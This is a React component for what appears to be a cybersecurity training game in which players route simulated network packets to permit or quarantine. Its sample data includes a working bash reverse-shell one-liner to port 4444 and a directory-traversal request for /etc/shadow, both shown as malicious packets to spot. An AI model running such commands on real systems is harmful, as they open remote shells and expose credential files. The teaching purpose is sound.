import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Shield, ShieldAlert, ShieldCheck, Radio, AlertTriangle, ArrowDown, CheckCircle2, XCircle, Sparkles } from 'lucide-react';
import { soundEngine } from '../../services/audio';

interface PacketSnifferSorterProps {
  onSubmit: (answer: string) => void;
  onTriggerHazard: (type: 'DATA_SURGE') => void;
  isSubmitting?: boolean;
}

interface NetworkPacket {
  id: string;
  sourceIp: string;
  destIp: string;
  protocol: string;
  port: number;
  payload: string;
  isMalicious: boolean;
  threatReason?: string;
}

const PACKET_STREAM: NetworkPacket[] = [
  {
    id: 'pkt_1',
    sourceIp: '198.51.100.23',
    destIp: '10.0.0.5',
    protocol: 'TCP',
    port: 4444,
    payload: 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1',
    isMalicious: true,
    threatReason: 'C2 Botnet reverse shell execution payload!',
  },
  {
    id: 'pkt_2',
    sourceIp: '10.0.0.12',
    destIp: '10.0.0.1',
    protocol: 'HTTPS',
    port: 443,
    payload: 'TLSv1.3 Encrypted Application Data (Authorized Vault Bridge)',
    isMalicious: false,
  },
  {
    id: 'pkt_3',
    sourceIp: '203.0.113.88',
    destIp: '10.0.0.2',
    protocol: 'TCP',
    port: 8080,
    payload: 'GET /../../../../etc/shadow HTTP/1.1 (Directory Traversal)',
    isMalicious: true,
    threatReason: 'LFI Directory Traversal root exploit attempt!',
  },
  {
    id: 'pkt_4',
    sourceIp: '10.0.0.99',
    destIp: '1.1.1.1',
    protocol: 'DNS',
    port: 53,
    payload: 'Standard Query A vault.cyber.internal',
    isMalicious: false,
  },
  {
    id: 'pkt_5',
    sourceIp: '198.51.100.99',
    destIp: '10.0.0.8',
    protocol: 'SYN',
    port: 22,
    payload: 'SYN Flood Exhaustion Signature (350,000 pps)',
    isMalicious: true,
    threatReason: 'DDoS SYN Flood socket exhaustion attack!',
  },
];

export const PacketSnifferSorter: React.FC<PacketSnifferSorterProps> = ({
  onSubmit,
  onTriggerHazard,
  isSubmitting = false,
}) => {
  const [currentPacketIdx, setCurrentPacketIdx] = useState(0);
  const [sortedCount, setSortedCount] = useState(0);
  const [errors, setErrors] = useState(0);
  const [statusMessage, setStatusMessage] = useState(
    'LIVE PACKET STREAM: Inspect incoming packet headers and drag or route them to PERMIT or QUARANTINE.'
  );

  const currentPacket = PACKET_STREAM[currentPacketIdx];
  const isFinished = currentPacketIdx >= PACKET_STREAM.length;

  const handleDecision = (quarantine: boolean) => {
    if (isFinished) return;
    soundEngine.playClick();

    const isCorrect = (quarantine && currentPacket.isMalicious) || (!quarantine && !currentPacket.isMalicious);

    if (isCorrect) {
      soundEngine.playSuccess();
      const nextIdx = currentPacketIdx + 1;
      setSortedCount(sortedCount + 1);
      setCurrentPacketIdx(nextIdx);

      if (nextIdx >= PACKET_STREAM.length) {
        soundEngine.playShield();
        setStatusMessage('✓ ALL PACKETS FILTERED & SEPARATED! PERIMETER DEFENSE ACTIVE!');
        setTimeout(() => {
          onSubmit('PACKET_FILTER_ACTIVE');
        }, 1200);
      } else {
        setStatusMessage(`✓ Packet #${currentPacketIdx + 1} correctly routed.`);
      }
    } else {
      soundEngine.playElectricZap();
      soundEngine.playError();
      const newErrors = errors + 1;
      setErrors(newErrors);
      setStatusMessage(
        `🚨 ROUTING ERROR: ${currentPacket.isMalicious ? 'Malicious packet leaked!' : 'Legitimate packet quarantined!'}`
      );

      if (newErrors >= 2) {
        soundEngine.playShortCircuitExplosion();
        setStatusMessage('🚨 SOC ALARM TRIGGERED: Multiple malicious packets leaked into perimeter!');
        setTimeout(() => {
          onTriggerHazard('DATA_SURGE');
        }, 500);
      }
    }
  };

  return (
    <div className="w-full bg-[#0a0507] border-2 border-rose-500/40 rounded-3xl p-6 shadow-2xl relative select-none font-mono overflow-hidden">
      {/* Background Matrix Grid */}
      <div className="absolute inset-0 bg-[linear-gradient(to_right,#ef444408_1px,transparent_1px),linear-gradient(to_bottom,#ef444408_1px,transparent_1px)] bg-[size:20px_20px] pointer-events-none" />

      {/* Header Info */}
      <div className="flex items-center justify-between gap-4 mb-4 pb-3 border-b border-rose-500/20 relative z-10">
        <div className="flex items-center gap-3">
          <div className="p-2.5 rounded-xl bg-rose-500/20 text-rose-400 border border-rose-500/30">
            <Radio className="w-6 h-6 animate-pulse" />
          </div>
          <div>
            <h3 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
              SOC PACKET SNIFFER & THREAT SORTER
              <span className="text-xs px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30">
                LIVE TRAFFIC
              </span>
            </h3>
            <p className="text-xs text-rose-200/70">
              Inspect payload headers. Route C2 Botnets/Exploits to QUARANTINE and internal packets to PERMIT.
            </p>
          </div>
        </div>

        <div className="flex items-center gap-2 px-3 py-1 rounded-xl bg-rose-950/40 border border-rose-500/30 text-xs text-rose-300">
          <Shield className="w-4 h-4 text-rose-400" />
          <span>PROGRESS: {sortedCount} / {PACKET_STREAM.length}</span>
        </div>
      </div>

      {/* Status banner */}
      <div className="bg-[#180d10] border border-rose-500/30 rounded-2xl p-3 mb-5 flex items-center justify-between gap-4 text-xs relative z-10">
        <div className="flex items-center gap-2 text-rose-300">
          <span className="w-2 h-2 rounded-full bg-rose-400 animate-ping" />
          <span>{statusMessage}</span>
        </div>
        <div className="text-[11px] px-2.5 py-1 bg-black/40 border border-rose-500/20 rounded-lg text-rose-400 font-bold">
          ERRORS: {errors} / 2
        </div>
      </div>

      {/* Active Packet Inspection Card */}
      {!isFinished && currentPacket ? (
        <AnimatePresence mode="wait">
          <motion.div
            key={currentPacket.id}
            initial={{ opacity: 0, y: 15, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: -15, scale: 0.95 }}
            className="p-5 bg-[#120a0d] border-2 border-rose-500/40 rounded-2xl mb-6 shadow-inner space-y-3 relative z-10"
          >
            <div className="flex items-center justify-between border-b border-rose-500/20 pb-2">
              <span className="text-xs font-bold text-rose-400 flex items-center gap-1.5">
                <Radio className="w-4 h-4 animate-pulse" />
                PACKET STREAM #{currentPacketIdx + 1}
              </span>
              <span className="text-[10px] px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 border border-rose-500/30">
                PROTOCOL: {currentPacket.protocol}
              </span>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 text-xs">
              <div className="bg-black/50 p-2.5 rounded-xl border border-white/5">
                <span className="text-[10px] text-gray-400 block">SOURCE IP</span>
                <span className="font-bold text-white">{currentPacket.sourceIp}</span>
              </div>
              <div className="bg-black/50 p-2.5 rounded-xl border border-white/5">
                <span className="text-[10px] text-gray-400 block">DESTINATION IP</span>
                <span className="font-bold text-white">{currentPacket.destIp}</span>
              </div>
              <div className="bg-black/50 p-2.5 rounded-xl border border-white/5 col-span-2 sm:col-span-1">
                <span className="text-[10px] text-gray-400 block">TARGET PORT</span>
                <span className="font-bold text-amber-400">PORT {currentPacket.port}</span>
              </div>
            </div>

            <div className="bg-black/70 p-3 rounded-xl border border-rose-500/20 font-mono text-xs">
              <span className="text-[10px] text-gray-400 block mb-1">HEX/ASCII PAYLOAD DECODE:</span>
              <span className="text-rose-200 break-all">{currentPacket.payload}</span>
            </div>
          </motion.div>
        </AnimatePresence>
      ) : (
        <div className="p-8 bg-[#120a0d] border-2 border-emerald-500/40 rounded-2xl mb-6 text-center text-emerald-300 font-bold space-y-2">
          <CheckCircle2 className="w-12 h-12 text-emerald-400 mx-auto" />
          <div className="text-base">ALL PACKETS FILTERED & THREATS QUARANTINED!</div>
        </div>
      )}

      {/* Decision Drop / Action Buttons */}
      <div className="grid grid-cols-2 gap-4 relative z-10">
        <button
          onClick={() => handleDecision(true)}
          disabled={isFinished}
          className="py-4 px-5 rounded-2xl bg-gradient-to-r from-rose-600 to-red-700 hover:from-rose-500 hover:to-red-600 text-white font-black text-sm shadow-[0_0_25px_rgba(239,68,68,0.4)] transition-all flex items-center justify-center gap-2 border border-rose-400/40 disabled:opacity-50"
        >
          <ShieldAlert className="w-5 h-5" />
          <span>🚨 QUARANTINE / DROP</span>
        </button>

        <button
          onClick={() => handleDecision(false)}
          disabled={isFinished}
          className="py-4 px-5 rounded-2xl bg-gradient-to-r from-emerald-600 to-teal-700 hover:from-emerald-500 hover:to-teal-600 text-white font-black text-sm shadow-[0_0_25px_rgba(16,185,129,0.4)] transition-all flex items-center justify-center gap-2 border border-emerald-400/40 disabled:opacity-50"
        >
          <ShieldCheck className="w-5 h-5" />
          <span>🛡️ PERMIT / PASS THROUGH</span>
        </button>
      </div>
    </div>
  );
};
